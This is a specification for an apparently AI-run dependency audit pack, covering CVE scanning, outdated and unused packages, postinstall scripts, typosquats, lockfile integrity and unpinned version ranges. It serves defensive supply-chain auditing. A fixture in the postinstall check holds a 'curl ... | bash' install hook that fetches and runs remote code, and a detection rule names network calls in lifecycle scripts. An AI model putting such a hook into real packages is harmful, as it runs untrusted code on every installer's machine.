# Dependencies Audit Pack

## Scope

This pack audits dependency health across multiple ecosystems: npm (JavaScript/TypeScript), pip (Python), Cargo (Rust), and Bundler (Ruby). It covers known CVE vulnerabilities via tool-backed spine wrappers (dep-audit, pip-audit, cargo-audit, bundler-audit), plus supply-chain checks for postinstall lifecycle scripts, typosquatting, lockfile integrity, and unpinned version ranges. It also covers npm-specific outdatedness and dead-code cleanup (knip). It does NOT audit license compliance (covered by the tos-compliance pack), Go dependency trees (covered by govulncheck in the security pack), peer-dependency conflicts beyond what npm audit reports, or Python/Ruby/Rust outdatedness (those ecosystems lack a tool-backed auditor in this wave).

**Pack ID:** `ccgm/dependencies`
**Applies when:** `language:javascript`

---

## applies_when Rationale

| Condition | Reason |
|-----------|--------|
| `language:javascript` | The ecosystem detector emits the `javascript` ecosystem for any repository that has a `package.json`; TypeScript repos additionally emit `typescript`. The registry derives condition tokens as `language:javascript` and `language:typescript` respectively. All LLM and knip checks target npm's package.json ecosystem; the dep-audit spine tool requires a package.json to function. Using `language:javascript` is the broadest honest gate: it covers both plain-JS and TypeScript projects. Wave 4.1 extends vulnerability coverage to Python (pip-audit), Rust (cargo-audit), and Ruby (bundler-audit) as additional spine tools — their wrappers run when the relevant manifest is present regardless of the pack gate, but the pack's LLM and grep checks remain npm-scoped. |

---

## Checks

---

### `dependencies/npm-audit-vulnerability`

**Severity:** `high`
**Confidence:** `high`
**Detection:** `tool`

#### Detection

**Tool (if detection = tool or hybrid):**
`dep-audit`

Rule / rule-id: `npm audit --json` (all advisories)

Fallback when tool absent: n/a — skip check when dep-audit is unavailable

**LLM instruction (if detection = llm or hybrid):**

```
(No LLM instruction — detection is tool-only via dep-audit spine wrapper.)
```

#### Spine Wiring

```yaml
check_id: dependencies/npm-audit-vulnerability
detection: tool
tool: dep-audit
```

**Spine-namespace note:** When dep-audit runs, the spine parser (`parse-dep-audit.py`) emits
findings with `check_id: deps/vulnerable-dependency` (rubric entry: high severity, high confidence,
high fix_confidence). The LLM worker triages these spine candidates via `spine_triage`.
The check-id `dependencies/npm-audit-vulnerability` is the pack's semantic label for this
audit category. The spine emits `deps/vulnerable-dependency`, not `dependencies/npm-audit-vulnerability`.

**Multi-ecosystem note:** `pip-audit`, `cargo-audit`, and `bundler-audit` also emit
`deps/vulnerable-dependency` findings. When any of these tools is absent the wrapper emits a
`coverage_gap` note with `tool: pip-audit` / `cargo-audit` / `bundler-audit`. The LLM worker
should treat such gaps as a recommendation to install the missing tool rather than a false negative.

#### Severity / Confidence

**Severity rationale:** npm audit findings correspond to published CVEs in dependencies. Even transitive vulnerability paths can be exploited if the vulnerable code path is reachable at runtime. HIGH severity because the vulnerability is externally published and confirmed; severity of a specific finding may be upgraded to CRITICAL if the advisory itself is CRITICAL.

**Confidence rationale:** npm audit output is deterministic — it cross-references the installed dependency tree against the npm advisory database. A reported vulnerability is either present or not; false positives are extremely rare, giving HIGH confidence.

**Rubric entry:** `dependencies/npm-audit-vulnerability`

#### Fixture

**True positive** (`package.json` with vulnerable dep):

```json
{
  "dependencies": {
    "lodash": "4.17.15"
  }
}
```
*(lodash 4.17.15 has known prototype pollution CVEs — npm audit reports HIGH)*

**True negative** (should produce NO finding):

```json
{
  "dependencies": {
    "lodash": "4.17.21"
  }
}
```
*(Patched version — npm audit reports no vulnerabilities)*

---

### `dependencies/outdated-minor`

**Severity:** `low`
**Confidence:** `high`
**Detection:** `llm`

#### Detection

**LLM instruction (if detection = llm or hybrid):**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

Run: npm outdated --json

Parse the output and identify all packages where the current installed version is behind the
latest MINOR or PATCH version (i.e. same major version, but current < latest). For semver
x.y.z packages: report where latest.major == current.major but latest > current.

For each such package: report the package name, currently installed version, and latest
available version. Classify as: auto_fixable=true (fix: npm update <package>).

Do NOT flag:
- Packages where the only available upgrade is a major version bump (reported separately)
- Packages pinned to an exact version that is still current for that major
- devDependencies that are already at the latest major (minor outdatedness in devDeps is
  acceptable noise; flag only if the gap is >2 minor versions)
```

#### Spine Wiring

```yaml
check_id: dependencies/outdated-minor
detection: llm
```

#### Severity / Confidence

**Severity rationale:** Minor version updates typically contain bug fixes and non-breaking improvements. Falling behind on minor versions accumulates small risks (unpatched bugs, compatibility drift). LOW because individual minor outdatedness rarely causes immediate harm.

**Confidence rationale:** `npm outdated` output is deterministic — the version comparison is exact. The LLM interprets well-structured JSON output, giving HIGH confidence that reported findings are real.

**Rubric entry:** `dependencies/outdated-minor`

#### Fixture

**True positive** (`npm outdated --json` output excerpt):

```json
{
  "react-query": {
    "current": "5.0.0",
    "wanted": "5.0.0",
    "latest": "5.3.1",
    "location": "node_modules/react-query"
  }
}
```
*(Same major, newer minor available — finding reported)*

**True negative** (should produce NO finding):

```json
{
  "react-query": {
    "current": "5.3.1",
    "wanted": "5.3.1",
    "latest": "5.3.1"
  }
}
```
*(Already at latest minor — no finding)*

---

### `dependencies/outdated-major`

**Severity:** `medium`
**Confidence:** `high`
**Detection:** `llm`

#### Detection

**LLM instruction (if detection = llm or hybrid):**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

Run: npm outdated --json

Parse the output and identify all packages where the latest available version has a higher
MAJOR version than the currently installed version (latest.major > current.major).

For each such package: report the package name, currently installed version, latest available
version, and the magnitude of the major version gap (e.g. 2 major versions behind). Classify
as auto_fixable=false — major version upgrades require reading changelogs and handling breaking
changes manually.

Note any packages that are several major versions behind (3+), as these may be unmaintained
or have security implications beyond what the CVE database covers.
```

#### Spine Wiring

```yaml
check_id: dependencies/outdated-major
detection: llm
```

#### Severity / Confidence

**Severity rationale:** Major version gaps indicate potential breaking changes, security patches backported only to newer majors, and accumulating technical debt. MEDIUM because the immediate risk varies by package and gap size; the finding requires human judgment to prioritize.

**Confidence rationale:** `npm outdated` major version comparison is deterministic. HIGH confidence that the package is behind on major versions, though the severity of impact requires human assessment.

**Rubric entry:** `dependencies/outdated-major`

#### Fixture

**True positive** (`npm outdated --json` output excerpt):

```json
{
  "webpack": {
    "current": "4.46.1",
    "wanted": "4.46.1",
    "latest": "5.90.1"
  }
}
```
*(Major version 4 → 5 gap — finding reported)*

**True negative** (should produce NO finding):

```json
{
  "webpack": {
    "current": "5.90.1",
    "wanted": "5.90.1",
    "latest": "5.90.1"
  }
}
```
*(Already at latest major — no finding)*

---

### `dependencies/unused-dependency`

**Severity:** `low`
**Confidence:** `medium`
**Detection:** `hybrid`

#### Detection

**Tool (if detection = tool or hybrid):**
`knip`

Rule / rule-id: knip `dependencies` issue list (packages listed in package.json that are not imported in source)

Fallback when tool absent: `llm`

**LLM instruction (if detection = llm or hybrid):**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

When knip is unavailable, perform a best-effort unused dependency scan:
1. Read package.json dependencies and devDependencies
2. Search source files (src/, app/, lib/, components/) for import or require statements
3. For each listed dependency, check whether any source file imports it
4. Flag any dependency with no import found as potentially unused

Do NOT flag:
- Dependencies used only in config files (e.g. babel.config.js, jest.config.ts, vite.config.ts)
- Peer dependencies or type-only packages (@types/*)
- CLI tools listed in scripts (e.g. "prettier": "prettier --write")
- Polyfills or side-effect-only imports

For each suspected unused dependency: package name, and confirmation that no import was found
in src/. auto_fixable=true — fix is: npm uninstall <package>.
```

#### Spine Wiring

```yaml
check_id: dependencies/unused-dependency
detection: hybrid
tool: knip
fallback: llm
```

**Spine-namespace note:** When knip runs, the spine parser (`parse-knip.py`) emits unused
dependencies in package.json with `check_id: dead-code/unused-dependency` (rubric entry: low
severity, medium confidence, high fix_confidence). The LLM worker triages these candidates
via `spine_triage`. The check-id `dependencies/unused-dependency` is the pack's semantic label.
The spine emits `dead-code/unused-dependency`, not `dependencies/unused-dependency`.

#### Severity / Confidence

**Severity rationale:** Unused dependencies increase bundle size, expand attack surface, and add maintenance burden without benefit. LOW severity because unused deps don't cause runtime errors or security vulnerabilities directly.

**Confidence rationale:** Knip uses static analysis to detect unused exports and dependencies, but dynamic imports, string-based requires, and config file usage can produce false positives. LLM confirmation helps but cannot fully resolve dynamic import patterns, yielding medium confidence.

**Rubric entry:** `dependencies/unused-dependency`

#### Fixture

**True positive** (`package.json` with unused dep):

```json
{
  "dependencies": {
    "moment": "2.29.4",
    "date-fns": "3.3.1"
  }
}
```
*(If only date-fns is imported in source files, moment is unused)*

**True negative** (should produce NO finding):

```json
{
  "dependencies": {
    "date-fns": "3.3.1"
  }
}
```
*(Only one date library, imported in source — no unused dependency)*

---

### `dependencies/duplicate-dependency`

**Severity:** `medium`
**Confidence:** `high`
**Detection:** `llm`

#### Detection

**LLM instruction (if detection = llm or hybrid):**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

Run: npm outdated --json (already available from other checks)
Also examine: package-lock.json or yarn.lock / pnpm-lock.yaml for duplicate dependency entries.

Identify cases where the same package appears at multiple version resolutions in the lockfile
(different subtrees require incompatible versions). Look specifically for:
- Multiple versions of the same package installed under different node_modules/ paths
- Packages listed in both dependencies and devDependencies with different version constraints
- Workspace packages in a monorepo that duplicate a root-level dependency at a different version

Also check package.json for packages that are both a runtime dependency and a devDependency
(overlapping entries).

Do NOT flag:
- Intentional version aliases or forks (e.g. "react-v17": "npm:react@17")
- Peer dependency ranges that resolve differently across workspaces (expected in monorepos)

For each duplicate: package name, the versions found, which subtrees require them,
and why deduplication requires investigation (breaking changes, peer constraints).
auto_fixable=false — deduplication requires resolving version constraints and testing.
```

#### Spine Wiring

```yaml
check_id: dependencies/duplicate-dependency
detection: llm
```

#### Severity / Confidence

**Severity rationale:** Duplicate dependency versions increase bundle size, can cause subtle runtime bugs when two instances of a library (e.g. React) co-exist, and complicate security patching. MEDIUM because impact varies by package and duplication depth.

**Confidence rationale:** Lockfile version enumeration is deterministic — a package either appears at multiple versions or it doesn't. HIGH confidence in detection accuracy.

**Rubric entry:** `dependencies/duplicate-dependency`

#### Fixture

**True positive** (`package-lock.json` excerpt showing two React installs):

```json
{
  "node_modules/react": { "version": "18.2.0" },
  "node_modules/some-legacy-lib/node_modules/react": { "version": "17.0.2" }
}
```
*(Two React versions in the tree — finding reported)*

**True negative** (should produce NO finding):

```json
{
  "node_modules/react": { "version": "18.2.0" }
}
```
*(Single React version — no duplicate)*

---

### `dependencies/postinstall-script`

**Severity:** `high`
**Confidence:** `medium`
**Detection:** `llm`

#### Detection

**LLM instruction:**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

Scan the repository for lifecycle scripts that run arbitrary code during package installation.

Step 1 — Project-level scripts:
  Read package.json (and workspace package.json files if this is a monorepo).
  Flag any of: "preinstall", "postinstall", "install", "preuninstall", "postuninstall"
  keys in the "scripts" object. These execute during npm install / npm uninstall for anyone
  who installs this package, and are a common supply-chain attack vector.

Step 2 — Third-party dependency scripts:
  Grep for '"postinstall"', '"preinstall"', '"install"' keys in files matching
  node_modules/*/package.json. For each hit, record the package name and script value.
  Flag packages whose script invokes a network call (curl, wget, fetch, https://),
  spawns a shell with untrusted input, or runs a compiled binary from an unusual path.

For each finding:
  - path: the package.json file containing the lifecycle script
  - message: the package name, script key, and first 80 chars of the script value
  - auto_fixable: false (removal requires verifying the script's purpose)

Do NOT flag:
  - Scripts that only invoke standard build tools (node, tsc, esbuild, rollup, webpack,
    babel, rimraf) with static arguments
  - Scripts from well-known, widely-audited packages (e.g. esbuild, turbo, node-gyp
    when building native extensions explicitly listed in the project's purpose)
  - husky or other developer-only lifecycle hooks that are clearly dev-only
```

#### Spine Wiring

```yaml
check_id: dependencies/postinstall-script
detection: llm
```

No dedicated spine tool — worker-run grep + LLM triage.

#### Severity / Confidence

**Severity rationale:** Postinstall scripts are a documented vector for npm supply-chain attacks (malicious packages executing code during `npm install`). HIGH severity because an exploited postinstall runs in the developer's environment with full shell access. A finding warrants manual review even when the script appears benign.

**Confidence rationale:** Detection is syntactic (presence of lifecycle script key) rather than semantic (analysis of what the script does). Whether the script is malicious requires human judgment; many legitimate packages use postinstall for native compilation. MEDIUM confidence because syntactic presence is reliable but impact assessment is not.

**Rubric entry:** `dependencies/postinstall-script`

#### Fixture

**True positive** (`package.json` with suspicious postinstall):

```json
{
  "name": "my-app",
  "scripts": {
    "postinstall": "curl https://example.com/setup.sh | bash"
  }
}
```
*(Postinstall fetches and executes remote code — finding reported)*

**True negative** (should produce NO finding):

```json
{
  "name": "my-app",
  "scripts": {
    "build": "tsc --project tsconfig.json",
    "test": "jest"
  }
}
```
*(No lifecycle installation scripts — no finding)*

---

### `dependencies/typosquat`

**Severity:** `high`
**Confidence:** `low`
**Detection:** `llm`

#### Detection

**LLM instruction (if detection = llm or hybrid):**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

Scan the project's dependency manifests for package names that are suspiciously similar to
well-known, popular packages — a classic typosquatting vector.

Step 1 — Collect all dependency names:
  Read package.json (dependencies, devDependencies, peerDependencies, optionalDependencies).
  If a requirements.txt or Gemfile is present, also collect their dependency names.

Step 2 — Check each name against known typosquatting patterns:
  Flag a dependency name if it:
    (a) Is one character away (addition, deletion, substitution, transposition) from a
        well-known package (e.g. "lodahs" for "lodash", "recat" for "react",
        "expresss" for "express", "axois" for "axios", "momentjs" for "moment",
        "babbel" for "babel", "typescirpt" for "typescript").
    (b) Replaces a hyphen with nothing or a number (e.g. "crossenv" for "cross-env",
        "dotenv2" for "dotenv").
    (c) Prepends or appends common confusing words ("node-", "the-", "-js", "-official")
        to a well-known package name where those affixes are NOT part of the canonical name.
    (d) Swaps a namespace prefix (e.g. "@babel/core" vs "babel-core" in contexts where
        the namespaced version is the canonical one).

For each suspicious dependency:
  - path: the manifest file (package.json, requirements.txt, Gemfile)
  - message: the suspicious name, the well-known name it resembles, and the edit distance
  - auto_fixable: false (requires verifying intent and potentially updating imports)

Do NOT flag:
  - Packages that are genuinely distinct from their lookalikes in a well-documented way
  - Packages that are explicitly scoped aliases ("lodash-es", "lodash-fp", "date-fns/esm")
    where the affix is part of the package's published purpose
  - Packages you cannot confidently associate with a popular counterpart
    (prefer false negatives over false positives for this check)
```

#### Spine Wiring

```yaml
check_id: dependencies/typosquat
detection: llm
```

No tool — LLM-only check. The LLM reasons about edit distance and naming conventions.

#### Severity / Confidence

**Severity rationale:** Typosquatted packages can install malware, steal credentials, or exfiltrate environment variables on any machine running `npm install` or `pip install`. HIGH severity because the impact of an exploited typosquat ranges from data exfiltration to full system compromise.

**Confidence rationale:** LLM-based edit-distance reasoning is inherently imprecise — the set of "popular packages" is not exhaustive, and many legitimate packages have names that are one character from a popular one. LOW confidence because false positives are frequent; this check is a screening aid, not a definitive detector. Findings require human confirmation.

**Rubric entry:** `dependencies/typosquat`

#### Fixture

**True positive** (`package.json` with typosquatted dep):

```json
{
  "dependencies": {
    "lodahs": "4.17.21"
  }
}
```
*(One-character transposition of "lodash" — suspicious name)*

**True negative** (should produce NO finding):

```json
{
  "dependencies": {
    "lodash": "4.17.21",
    "lodash-es": "4.17.21"
  }
}
```
*("lodash-es" is the canonical ESM build of lodash, not a typosquat)*

---

### `dependencies/lockfile-integrity`

**Severity:** `high`
**Confidence:** `medium`
**Detection:** `llm`

#### Detection

**LLM instruction:**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

Check the repository's dependency lockfile for integrity issues.

Check 1 — Lockfile missing:
  If package.json exists but NO lockfile (package-lock.json, yarn.lock, pnpm-lock.yaml,
  bun.lockb, Pipfile.lock, poetry.lock, Cargo.lock, Gemfile.lock) is present in the same
  directory, report a missing lockfile. A missing lockfile means installs are non-deterministic
  and dependency versions are not pinned.

Check 2 — Lockfile out of sync:
  If package.json and package-lock.json (or yarn.lock / pnpm-lock.yaml) both exist,
  check for signs of divergence:
    (a) A dependency listed in package.json that has NO entry in the lockfile.
    (b) A dependency in the lockfile at a version OUTSIDE the semver range declared in
        package.json (e.g. lockfile pins 5.0.0 but package.json requires "^6.0.0").
  Both conditions indicate the lockfile was not regenerated after editing package.json.

For each finding:
  - path: package.json (for missing lockfile) or the lockfile path (for sync issues)
  - message: which manifest, what is missing or diverged, and the fix command
  - auto_fixable: false (regenerating a lockfile can change resolved versions)

Do NOT flag:
  - Repositories that intentionally omit a lockfile (e.g. published libraries where
    package.json specifies only peer dependency ranges and no lockfile is conventional)
  - Monorepo workspaces that share a single root-level lockfile
```

#### Spine Wiring

```yaml
check_id: dependencies/lockfile-integrity
detection: llm
```

No dedicated spine tool — worker-run file-existence checks + LLM comparison.

#### Severity / Confidence

**Severity rationale:** A missing or out-of-sync lockfile means CI and developer machines can install different package versions, making the build non-reproducible and potentially allowing a malicious package version to be resolved at install time. HIGH severity because reproducibility failures directly enable supply-chain drift.

**Confidence rationale:** Lockfile presence is a deterministic check. Sync divergence requires comparing version ranges across two files, which the LLM can perform with moderate accuracy; subtle range edge cases may be missed. MEDIUM confidence.

**Rubric entry:** `dependencies/lockfile-integrity`

#### Fixture

**True positive** (package.json present, no lockfile):

```
package.json      ← exists
(no package-lock.json, yarn.lock, pnpm-lock.yaml)
```
*(Lockfile absent — non-deterministic installs)*

**True negative** (should produce NO finding):

```
package.json          ← exists
package-lock.json     ← exists, versions in sync
```
*(Both files present and in sync — no finding)*

---

### `dependencies/unpinned-version-range`

**Severity:** `medium`
**Confidence:** `high`
**Detection:** `llm`

#### Detection

**LLM instruction:**

```
READ AND APPLY: ~/.claude/skills/audit/reference/fix-patterns.md
Consult the Fix Type Reference table and confidence levels from that file when classifying
each finding's fix_type and fix_confidence. Do not rely on memory — open and apply the file.

Scan dependency manifests for version specifiers that allow a range of versions to be
resolved at install time. Focus on production dependencies of sensitive packages.

Step 1 — Collect manifests:
  Read: package.json (dependencies, devDependencies, peerDependencies),
        requirements.txt or pyproject.toml (Python),
        Gemfile (Ruby — look for gem directives without a `:require => false` or version pin).

Step 2 — Flag unpinned specifiers in sensitive contexts:
  Flag a dependency entry if:
    (a) package.json: dependency uses ^, ~, >=, >, *, or "latest" as the version specifier,
        AND the package is a production dependency (not devDependencies) that handles
        authentication, cryptography, HTTP requests, database access, or serialization.
        Examples of sensitive categories: axios, got, node-fetch, bcrypt, jsonwebtoken,
        passport, sequelize, mongoose, pg, prisma, multer, formidable, serialize-javascript.
    (b) requirements.txt: dependency uses >= or no version pin at all (bare package name),
        AND the package is a network, crypto, or serialization library (requests, pycryptodome,
        cryptography, paramiko, sqlalchemy, flask, django).
    (c) Gemfile: dependency uses no version constraint or only a ~> (pessimistic) constraint
        that allows minor-or-patch upgrades on a cryptography or network gem (openssl, net-http,
        faraday, httparty, rack, rails).

  Do NOT flag:
    - devDependencies with caret ranges (standard and acceptable for build tooling)
    - Packages that are clearly not security-sensitive (date formatters, UI utilities, test helpers)
    - peerDependencies (ranges are the norm for peer deps)
    - Version specifiers that are already exact (e.g. "1.2.3", "==1.2.3", "= 1.2.3")
    - Internal workspace packages ("workspace:*" or "file:../")

For each finding:
  - path: the manifest file
  - message: the package name, the current specifier, and why the range is sensitive
  - auto_fixable: false — pinning requires running the install and committing the exact version
```

#### Spine Wiring

```yaml
check_id: dependencies/unpinned-version-range
detection: llm
```

No dedicated spine tool — worker-run grep for `^`, `~`, `>=`, `*` in manifest files + LLM triage for sensitivity.

#### Severity / Confidence

**Severity rationale:** Unpinned ranges on security-sensitive packages allow a compromised patch release to be silently pulled in on the next `npm install` or `pip install`. MEDIUM severity because the risk materializes only if the upstream package is itself compromised; for most projects the likelihood is low but the impact is high.

**Confidence rationale:** Detecting range syntax in a manifest is deterministic and reliable — the grep or LLM can read the version string exactly. Determining whether a package is "sensitive" requires LLM judgment, which is imperfect but generally accurate for well-known ecosystem packages. HIGH confidence overall.

**Rubric entry:** `dependencies/unpinned-version-range`

#### Fixture

**True positive** (`package.json` with unpinned production dep):

```json
{
  "dependencies": {
    "jsonwebtoken": "^9.0.0",
    "axios": "*"
  }
}
```
*(jsonwebtoken with caret range and axios with wildcard — both security-sensitive, both unpinned)*

**True negative** (should produce NO finding):

```json
{
  "dependencies": {
    "jsonwebtoken": "9.0.2"
  },
  "devDependencies": {
    "jest": "^29.0.0"
  }
}
```
*(jsonwebtoken is exactly pinned; jest caret range is devDependency — no finding)*

---

## Migration Mapping

Every bullet from the original Agent 2 Dependencies Audit category prompt is mapped to its owning check-id:

| Original prompt bullet | Check-id |
|------------------------|----------|
| npm audit vulnerabilities (auto-fixable: npm audit fix for non-breaking) | `dependencies/npm-audit-vulnerability` |
| Outdated packages - minor versions (auto-fixable: npm update) | `dependencies/outdated-minor` |
| Outdated packages - major versions (NOT auto-fixable - breaking changes) | `dependencies/outdated-major` |
| Unused dependencies (auto-fixable: npm uninstall) | `dependencies/unused-dependency` |
| Duplicate dependencies (NOT auto-fixable - needs investigation) | `dependencies/duplicate-dependency` |

Wave 4.1 additions:

| New check | Motivation |
|-----------|-----------|
| `dependencies/postinstall-script` | Supply-chain: lifecycle scripts that execute arbitrary code at install time |
| `dependencies/typosquat` | Supply-chain: package names one edit away from popular packages |
| `dependencies/lockfile-integrity` | Supply-chain: missing or out-of-sync lockfile allows non-deterministic installs |
| `dependencies/unpinned-version-range` | Supply-chain: caret/tilde/wildcard ranges on security-sensitive production deps |

Multi-ecosystem vulnerability coverage (Wave 4.1) via new spine tools:

| Ecosystem | Tool | Spine check-id | Absent-tool behavior |
|-----------|------|----------------|----------------------|
| Python | pip-audit | `deps/vulnerable-dependency` | `coverage_gap` + LLM fallback note |
| Rust | cargo-audit | `deps/vulnerable-dependency` | `coverage_gap` + LLM fallback note |
| Ruby | bundler-audit | `deps/vulnerable-dependency` | `coverage_gap` + LLM fallback note |

---

## Quality Checklist

- [x] Each check-id in this file exactly matches `pack.json`'s `checks[].id`
- [x] Every check with `detection: tool` or `detection: hybrid` names a real spine tool
- [x] Every check with `detection: llm` or `detection: hybrid` has a filled-in LLM instruction
- [x] Each fixture has both a true positive AND a true negative
- [x] Severity / confidence rationale is present for every check
- [x] `applies_when` rationale table is complete
- [x] `scripts/lint-pack.py` passes on this pack
